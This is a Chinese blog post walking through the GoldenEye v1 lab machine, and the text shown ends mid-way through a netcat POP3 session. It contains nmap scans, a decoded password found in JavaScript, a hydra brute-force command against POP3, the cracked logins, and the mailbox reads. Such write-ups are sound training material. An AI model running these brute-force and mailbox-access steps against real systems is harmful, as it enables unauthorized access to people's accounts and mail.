<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>1-GoldenEye-v1 | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455┌──(root㉿kali)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:26:ba:69, IPv4: 192.1">
<meta property="og:type" content="article">
<meta property="og:title" content="1-GoldenEye-v1">
<meta property="og:url" content="https://xyaxxya.github.io/2024/10/15/1-GoldenEye-v1/index.html">
<meta property="og:site_name" content="Yiyi">
<meta property="og:description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455┌──(root㉿kali)-[~]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:26:ba:69, IPv4: 192.1">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.dmoe.cc/random.php?5348">
<meta property="article:published_time" content="2024-10-15T10:57:45.000Z">
<meta property="article:modified_time" content="2024-11-01T08:58:23.562Z">
<meta property="article:author" content="yiyi">
<meta property="article:tag" content="渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.dmoe.cc/random.php?5348"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/2024/10/15/1-GoldenEye-v1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '1-GoldenEye-v1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-11-01 16:58:23'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?5348')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">1-GoldenEye-v1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-15T10:57:45.000Z" title="发表于 2024-10-15 18:57:45">2024-10-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-01T08:58:23.562Z" title="更新于 2024-11-01 16:58:23">2024-11-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/10/15/1-GoldenEye-v1/" data-flag-title="1-GoldenEye-v1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/10/15/1-GoldenEye-v1/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/10/15/1-GoldenEye-v1/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># arp-scan -l</span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:26:ba:69, IPv4: 192.168.3.11</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.3.1     00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.3.2     00:50:56:e4:e9:e5       VMware, Inc.</span><br><span class="line">192.168.3.13    00:0c:29:4a:22:25       VMware, Inc.</span><br><span class="line">192.168.3.254   00:50:56:e4:7d:ff       VMware, Inc.</span><br><span class="line">192.168.3.1     00:50:56:c0:00:08       VMware, Inc. (DUP: 2)</span><br><span class="line"></span><br><span class="line">7 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned <span class="keyword">in</span> 2.014 seconds (127.11 hosts/sec). 4 responded</span><br><span class="line">                                                                                                                                    </span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -Pn -A -sV -T4 -p- 192.168.3.13</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 06:56 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.13</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">25/tcp    open  smtp     Postfix smtpd</span><br><span class="line">| ssl-cert: Subject: commonName=ubuntu</span><br><span class="line">| Not valid before: 2018-04-24T03:22:34</span><br><span class="line">|_Not valid after:  2028-04-21T03:22:34</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: GoldenEye Primary Admin Server</span><br><span class="line">55006/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER CAPA PIPELINING TOP UIDL RESP-CODES</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">55007/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE STLS UIDL USER CAPA SASL(PLAIN) RESP-CODES TOP PIPELINING</span><br><span class="line">MAC Address: 00:0C:29:4A:22:25 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms 192.168.3.13</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 36.60 seconds</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015185830813.png" alt="image-20241015185830813"></p>
<p>访问对应目录</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015185905198.png" alt="image-20241015185905198"></p>
<p>于是寻找可疑用户名密码</p>
<p>源码terminal.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">GoldenEyeText</span>: <span class="string">&quot;&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;typeing&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; allElements.<span class="property">length</span>; j++) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentElementId = allElements[j].<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">var</span> currentElementIdContent = data[<span class="number">0</span>][currentElementId];</span><br><span class="line">  <span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(currentElementId);</span><br><span class="line">  <span class="keyword">var</span> devTypeText = currentElementIdContent;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>, isTag, text;</span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">type</span>(<span class="params"></span>) &#123;</span><br><span class="line">    text = devTypeText.<span class="title function_">slice</span>(<span class="number">0</span>, ++i);</span><br><span class="line">    <span class="keyword">if</span> (text === devTypeText) <span class="keyword">return</span>;</span><br><span class="line">    element.<span class="property">innerHTML</span> = text + <span class="string">`&lt;span class=&#x27;blinker&#x27;&gt;&amp;#32;&lt;/span&gt;`</span>;</span><br><span class="line">    <span class="keyword">var</span> char = text.<span class="title function_">slice</span>(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&lt;&quot;</span>) isTag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&gt;&quot;</span>) isTag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTag) <span class="keyword">return</span> <span class="title function_">type</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(type, <span class="number">60</span>);</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>username</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Boris</span><br><span class="line">Natalya</span><br></pre></td></tr></table></figure>

<p>password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015190319310.png" alt="image-20241015190319310"></p>
<p>得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvincibleHack3r</span><br></pre></td></tr></table></figure>

<p>成功登录</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015190437284.png" alt="image-20241015190437284"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GoldenEye is a Top Secret Soviet oribtal weapons project.  Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)</span><br><span class="line"></span><br><span class="line">Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system</span><br><span class="line"></span><br><span class="line">Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port</span><br></pre></td></tr></table></figure>

<p><strong>POP3服务器的默认端口是110</strong>，结合前面的nmap全端口扫描发现此处为55006，55007</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -Pn -A -sV -T4 -p- 192.168.3.13</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 06:56 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.13</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">25/tcp    open  smtp     Postfix smtpd</span><br><span class="line">| ssl-cert: Subject: commonName=ubuntu</span><br><span class="line">| Not valid before: 2018-04-24T03:22:34</span><br><span class="line">|_Not valid after:  2028-04-21T03:22:34</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: GoldenEye Primary Admin Server</span><br><span class="line">55006/tcp open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER CAPA PIPELINING TOP UIDL RESP-CODES</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">55007/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">|_Not valid after:  2028-04-23T03:23:52</span><br><span class="line">|_pop3-capabilities: AUTH-RESP-CODE STLS UIDL USER CAPA SASL(PLAIN) RESP-CODES TOP PIPELINING</span><br><span class="line">MAC Address: 00:0C:29:4A:22:25 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>

<p>使用海德拉爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P /root/yiyi/wordlists-master/fasttrack.txt -s -t 32 55007 -V 192.168.3.13 pop3 -I </span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015192749712.png" alt="image-20241015192749712"></p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[55007][pop3] host: 192.168.4.202   login: natalya   password: bird</span><br><span class="line">[55007][pop3] host: 192.168.4.202   login: boris   password: secret1!</span><br></pre></td></tr></table></figure>

<p>nc连接登录boris后查看邮件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># nc 192.168.3.13 55007 </span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user boris</span><br><span class="line">+OK</span><br><span class="line">pass secret1!</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 3 messages:</span><br><span class="line">1 544</span><br><span class="line">2 373</span><br><span class="line">3 921</span><br><span class="line">.</span><br><span class="line">retr 1  </span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP <span class="built_in">id</span> D9E47454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I<span class="string">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 373 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;natalya@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from ok (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: natalya@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris, I can break your codes!</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 3</span></span><br><span class="line"><span class="string">+OK 921 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;alec@janus.boss&gt;</span></span><br><span class="line"><span class="string">X-Original-To: boris</span></span><br><span class="line"><span class="string">Delivered-To: boris@ubuntu</span></span><br><span class="line"><span class="string">Received: from janus (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span></span><br><span class="line"><span class="string">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Wed, 22 Apr 1995 19:51:48 